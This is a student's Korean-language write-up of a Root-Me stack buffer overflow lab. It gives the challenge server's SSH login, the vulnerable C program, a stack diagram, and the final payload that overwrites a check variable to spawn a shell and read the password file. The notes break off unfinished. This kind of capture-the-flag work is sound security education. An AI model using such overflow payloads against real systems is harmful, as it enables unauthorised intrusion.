## Week4_HW_Root-Me_BofBasic1

> ### Access
* `ssh -p 2222 app-systeme-ch13@challenge02.root-me.org`   
* passwd : `app-systeme-ch13`
> ### Download File to get assembly code
* `scp -P2222 app-systeme-ch13@challenge02.root-me.org:./ch13 ./ch13`

<hr>

* Source code
```c
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
 
int main()
{
 
  int var;
  int check = 0x04030201;
  char buf[40];
 
  fgets(buf,45,stdin);
 
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
 
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
 
  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```
<hr>

### Explanation

* 변수가 var -> check -> buf 순으로 선언되었기 때문에 
* 위 코드에서 스택의 구조는 아래와 같다.


```<pre>
[      buf[40]      ]
[ check(0x04030201) ]
[        var        ]
[        SFP        ]
[        RET        ]

```

* fgets함수로 45바이트의 문자를 받을 수 있기 때문에 
check변수를 원하는 값(0xdeadbeef)으로 덮을 수 있다.

* buf에 40byte를 채우고 check에 0xdeadbeef를 리틀엔디언 방식을 넣어주면 쉘이 실행될 것이다.
* 위의 과정을 수행할 수 있는 페이로드를 짜면 
`(python -c 'print "A"*40 + "\xef\xbe\xad\xde"') | ./ch13`
이다. 
    * "|" 기호는 "파이프라인"이라는 기호로 한명령어의 출력을 다른 명령어의 입력으로 연결하는데 사용된다.
    * 따라서 파이프라인 왼쪽에 있는 입력값을 './ch13'의 입력을 전달한다.
* _**그러나!!**_ 이대로 실행하면 "shell closed! Bye" 라는 문구가 출력되면서 쉘이 종료된다.
* 이를 방지하기 위해 cat과 같이 shell 실행 후 입력을 받아주는 명령어를 추가하여 shell이 종료되지 않고 유지되게 해준다.
* 명령어를 구분하는 구분자로 ";" 가 사용되므로 
`(python -c 'print "A"*40 + "\xef\xbe\xad\xde"' ; cat) | ./ch13` 가 최종 페이로드코드가 된다.

* 위 페이로드를 넣으면 `"Yeah dude! You win!\nOpening your shell...\n"` 라는 문구가 나오고
* 이후 `ls -a` 명령어를 통해 .passwd파일을 확인할 수 있고 `cat` 명령어를 통해 password를 취할 수 있다.

> assembly code 

* fgets함수 호출 전 인자 세팅하는 구간 유의 
* 마지막 인자부터 세팅됨
* rdi rsi rdx rcx 얘는 뭐냐 ? 아하 ! 
* 32비트 구조에서는 인자를 저장하는 레지스터가 따로 없으며 그냥 stack 에 push 됨. 
* 


